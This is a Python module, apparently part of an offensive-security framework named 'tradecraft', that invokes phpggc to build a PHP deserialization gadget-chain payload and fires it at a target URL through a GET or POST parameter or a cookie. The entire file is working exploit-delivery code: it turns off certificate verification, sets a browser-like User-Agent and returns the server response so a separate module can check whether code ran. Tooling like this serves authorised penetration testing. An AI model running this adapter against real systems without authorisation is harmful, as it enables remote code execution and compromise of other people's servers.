"""
Subprocess + HTTP execution for phpggc: generates exactly one PHP
gadget-chain payload with the phpggc script, then delivers it to one
target parameter/cookie in exactly one HTTP request. No parsing logic
here -- see parse.py for chain selection, encoding, and confirmation.
"""
from __future__ import annotations

import os
import subprocess
from typing import Optional

import requests
import urllib3

from tradecraft.adapters.phpggc import parse as phpggc_parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PHPGGC_SCRIPT_PATH = "/opt/phpggc/phpggc"
PHPGGC_SCRIPT_ENV = "PHPGGC_SCRIPT"

# Hard caps on this call's blast radius, independent of --allow-destructive:
# one payload generation, one HTTP request, bounded subprocess/HTTP time,
# bounded payload and response size. The flag controls availability, not
# how much one call can do.
PHPGGC_TIMEOUT_SECONDS = 10
HTTP_TIMEOUT_SECONDS = 15
MAX_PAYLOAD_BYTES = 8192
MAX_RESPONSE_CHARS = 50000
MAX_ERROR_CHARS = 2000


def find_script() -> Optional[str]:
    """phpggc script path: PHPGGC_SCRIPT override first, then the
    project's conventional /opt/phpggc/phpggc install location."""
    for candidate in (os.environ.get(PHPGGC_SCRIPT_ENV, ""), PHPGGC_SCRIPT_PATH):
        if candidate and os.path.isfile(candidate):
            return candidate
    return None


def execute(
    target: str,
    parameter: str,
    method: str = "GET",
    framework: str = "",
    cookie: str = "",
    timeout: int = HTTP_TIMEOUT_SECONDS,
    session: Optional[requests.Session] = None,
) -> phpggc_parse.RawPhpggcResult:
    """Generate one chain and deliver it once. Returns a raw result; the
    caller/`parse_result` decides whether it confirmed execution."""
    url = phpggc_parse.normalize_target_url(target)
    if not url:
        return phpggc_parse.RawPhpggcResult(error="empty target URL")
    if not parameter or not parameter.strip():
        return phpggc_parse.RawPhpggcResult(
            target=url, error="missing required parameter"
        )

    http_method, method_error = phpggc_parse.normalize_method(method)
    if method_error:
        return phpggc_parse.RawPhpggcResult(
            target=url, parameter=parameter, error=method_error
        )

    gadget, framework_error = phpggc_parse.select_gadget_chain(framework)
    if framework_error:
        return phpggc_parse.RawPhpggcResult(
            target=url, parameter=parameter, method=http_method, error=framework_error
        )

    script = find_script()
    if not script:
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error=f"phpggc script not found at {PHPGGC_SCRIPT_PATH}",
        )

    argv = phpggc_parse.build_phpggc_argv(script, gadget)
    try:
        proc = subprocess.run(
            argv,
            capture_output=True,
            timeout=PHPGGC_TIMEOUT_SECONDS,
            stdin=subprocess.DEVNULL,
        )
    except FileNotFoundError:
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error="php executable not found on PATH",
        )
    except subprocess.TimeoutExpired:
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error=(
                f"phpggc payload generation timed out after "
                f"{PHPGGC_TIMEOUT_SECONDS}s"
            ),
        )
    except OSError as exc:
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error=f"phpggc execution failed: {exc}",
        )

    if proc.returncode != 0:
        # phpggc reports its own errors ("ERROR: Unknown gadget chain:
        # ...") on stdout with a non-zero exit, and deprecation notices on
        # stderr -- report both, never stderr alone (the original adapter
        # read stderr only and produced an empty error message).
        detail = ((proc.stderr or b"") + (proc.stdout or b"")).decode(
            "utf-8", errors="ignore"
        ).strip()
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error=(
                f"phpggc failed (exit {proc.returncode}): "
                f"{detail[:MAX_ERROR_CHARS] or 'no output'}"
            ),
        )

    payload = proc.stdout or b""
    if not payload.strip():
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error="phpggc produced an empty payload",
        )
    if len(payload) > MAX_PAYLOAD_BYTES:
        return phpggc_parse.RawPhpggcResult(
            target=url,
            parameter=parameter,
            method=http_method,
            gadget=gadget,
            error=(
                f"generated payload is {len(payload)} bytes, over the "
                f"{MAX_PAYLOAD_BYTES}-byte cap for one call"
            ),
        )

    payload_b64 = phpggc_parse.encode_payload(payload)
    result = phpggc_parse.RawPhpggcResult(
        target=url,
        parameter=parameter,
        method=http_method,
        framework=framework,
        gadget=gadget,
        payload_b64=payload_b64,
    )

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) tradecraft/1.0"}
    close_session = False
    if session is None:
        session = requests.Session()
        close_session = True

    try:
        if http_method == "GET":
            if cookie:
                headers["Cookie"] = cookie
            response = session.get(
                url,
                params={parameter: payload_b64},
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
        elif http_method == "POST":
            if cookie:
                headers["Cookie"] = cookie
            response = session.post(
                url,
                data={parameter: payload_b64},
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
        else:  # COOKIE
            headers["Cookie"] = phpggc_parse.build_cookie_header(
                cookie, parameter, payload_b64
            )
            response = session.get(
                url,
                headers=headers,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )

        result.status_code = response.status_code
        result.response_body = (response.text or "")[:MAX_RESPONSE_CHARS]
    except requests.RequestException as exc:
        result.error = f"HTTP request failed: {exc}"
    finally:
        if close_session:
            session.close()

    return result
